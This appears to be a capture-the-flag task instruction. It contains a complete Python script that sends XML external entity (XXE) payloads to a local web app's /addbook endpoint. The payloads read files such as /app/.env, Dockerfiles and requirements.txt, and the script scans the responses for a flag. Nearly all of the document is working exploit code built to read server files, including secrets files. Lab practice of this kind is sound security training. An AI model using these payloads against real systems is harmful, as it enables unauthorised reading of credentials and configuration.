Use XXE to search for flag references in text-based configuration files. Create a Python script that:

1. Tests reading these common application files (avoid .py to prevent XML errors):
   - /app/requirements.txt
   - /app/README.md
   - /app/README.txt
   - /app/config.txt
   - /app/.env
   - /app/Dockerfile
   - /Dockerfile
   - /README.md

2. For each file, send XXE payload:
```python
import requests

files_to_test = [
    '/app/requirements.txt',
    '/app/README.md', 
    '/app/README.txt',
    '/app/Dockerfile',
    '/Dockerfile',
    '/README.md',
    '/app/.env',
    '/requirements.txt'
]

results = {}

for filepath in files_to_test:
    xml_payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file://{filepath}">]>
<Book>
    <Title>Read {filepath}</Title>
    <ISBN>&file;</ISBN>
    <Editor>Test</Editor>
    <Publisher>Test</Publisher>
    <Chapters></Chapters>
</Book>'''
    
    try:
        response = requests.post(
            'http://127.0.0.1:5000/addbook',
            data={'xml': xml_payload},
            timeout=5
        )
        
        if response.status_code == 200 and 'FLAG' in response.text.upper():
            results[filepath] = response.text
            print(f"[+] Found FLAG reference in {filepath}")
            print(response.text[:500])
        elif response.status_code == 200 and 'You have append this book successfully' in response.text:
            results[filepath] = response.text
            print(f"[+] Successfully read {filepath}")
    except Exception as e:
        print(f"[-] Error reading {filepath}: {e}")

print("\n=== SUMMARY ===")
for path, content in results.items():
    print(f"\n{path}:")
    print(content[:300])
